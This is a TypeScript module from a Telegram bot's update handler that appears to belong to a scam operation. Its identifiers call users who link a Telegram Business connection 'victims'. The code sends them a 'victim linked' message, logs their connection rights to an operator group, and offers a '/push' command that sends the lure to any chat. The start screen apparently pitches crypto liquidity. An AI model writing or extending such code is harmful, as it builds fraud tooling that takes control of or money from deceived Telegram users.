import { config } from "./config.js";
import { describeUpdate } from "./errors.js";
import { formatUser, logError, logTopic } from "./log.js";
import { sendStartMedia } from "./media.js";
import {
  buildHowMessage,
  buildLangMessage,
  buildStartMessage,
  howKeyboard,
  langKeyboard,
  startKeyboard,
  victimLinkedKeyboard,
  victimLinkedText,
} from "./messages.js";
import { handleInboxMessage } from "./media-inbox.js";
import { listEnabled, upsertConnection } from "./store.js";
import {
  answerCallbackQuery,
  editMessageText,
  sendMessage,
  type Update,
} from "./telegram.js";

async function sendStartScreen(chatId: number): Promise<void> {
  const { text, entities } = buildStartMessage();
  await sendStartMedia(chatId, text, {
    entities,
    reply_markup: startKeyboard(),
  });
}

async function onboardVictimOwner(
  businessConnectionId: string,
  ownerChatId: number,
  owner: { id: number; username?: string; first_name?: string; last_name?: string },
): Promise<void> {
  await sendMessage(ownerChatId, victimLinkedText, {
    reply_markup: victimLinkedKeyboard(businessConnectionId),
    link_preview_options: { is_disabled: true },
  });
}

async function handleCallback(update: Update): Promise<void> {
  const cq = update.callback_query;
  if (!cq?.data || !cq.message) return;
  const chatId = cq.message.chat.id;
  const msgId = cq.message.message_id;
  const data = cq.data;

  if (data === "how_liquidity") {
    const { text, entities } = buildHowMessage();
    await editMessageText(chatId, msgId, text, {
      entities,
      reply_markup: howKeyboard(),
    });
  } else if (data === "change_lang") {
    const { text, entities } = buildLangMessage();
    await editMessageText(chatId, msgId, text, {
      entities,
      reply_markup: langKeyboard(),
    });
  } else if (data === "back_start") {
    const { text, entities } = buildStartMessage();
    await editMessageText(chatId, msgId, text, {
      entities,
      reply_markup: startKeyboard(),
    });
  } else if (data.startsWith("lang_")) {
    await answerCallbackQuery(cq.id, "Язык скоро будет · Language soon");
    return;
  }

  await answerCallbackQuery(cq.id);
}

export async function handleTelegramUpdate(update: Update): Promise<void> {
  if (update.callback_query) {
    await handleCallback(update);
    return;
  }

  const bc = update.business_connection;
  if (bc) {
    upsertConnection({
      id: bc.id,
      userId: bc.user.id,
      enabled: bc.is_enabled,
      updatedAt: new Date().toISOString(),
    });

    try {
      if (bc.is_enabled) {
        const ownerChat = bc.user_chat_id ?? bc.user.id;
        await onboardVictimOwner(bc.id, ownerChat, bc.user);
        await logTopic(
          "connections",
          `🔌 подключение\n${formatUser(bc.user)}\nbc <code>${bc.id}</code>\nrights <code>${bc.rights ? JSON.stringify(bc.rights) : "—"}</code>`,
        );
      } else {
        await logTopic("connections", `⛔ отключение\n${formatUser(bc.user)}`);
      }
    } catch (e) {
      await logError("business_connection_handler", e, {
        bc_id: bc.id,
        user_id: bc.user.id,
        enabled: bc.is_enabled,
      });
    }
    return;
  }

  const msg = update.message;
  if (!msg) return;
  const chatId = msg.chat.id;

  await handleInboxMessage(msg as unknown as Record<string, unknown>, chatId).catch(
    () => undefined,
  );

  if (!msg.text) return;

  if (msg.text.startsWith("/start")) {
    await sendStartScreen(chatId);
    await logTopic("starts", `▶️ /start\n${formatUser(msg.from)}`);
    return;
  }

  if (
    msg.text.startsWith("/threadid") &&
    msg.from?.id === Number(config.adminChatId) &&
    String(chatId) === config.logGroupId
  ) {
    const thread = (msg as { message_thread_id?: number }).message_thread_id;
    await sendMessage(
      chatId,
      `chat <code>${chatId}</code>\nthread <code>${thread ?? "—"}</code>`,
      {
        parse_mode: "HTML",
        message_thread_id: thread,
      },
    );
    return;
  }

  if (msg.text.startsWith("/push")) {
    const parts = msg.text.split(/\s+/);
    const target = Number(parts[1]);
    if (!target) {
      await sendMessage(chatId, "usage: /push <chat_id>");
      return;
    }
    const enabled = listEnabled();
    if (!enabled.length) {
      await sendMessage(chatId, "no active business_connection");
      return;
    }
    const conn = enabled[enabled.length - 1]!;
    await sendMessage(target, victimLinkedText, {
      reply_markup: victimLinkedKeyboard(conn.id),
    });
    await sendMessage(chatId, `pushed to ${target}`);
  }
}

export async function handleTelegramUpdateSafe(update: Update): Promise<void> {
  try {
    await handleTelegramUpdate(update);
  } catch (e) {
    console.error(e);
    await logError("telegram_update_handler", e, describeUpdate(update)).catch(() => undefined);
  }
}
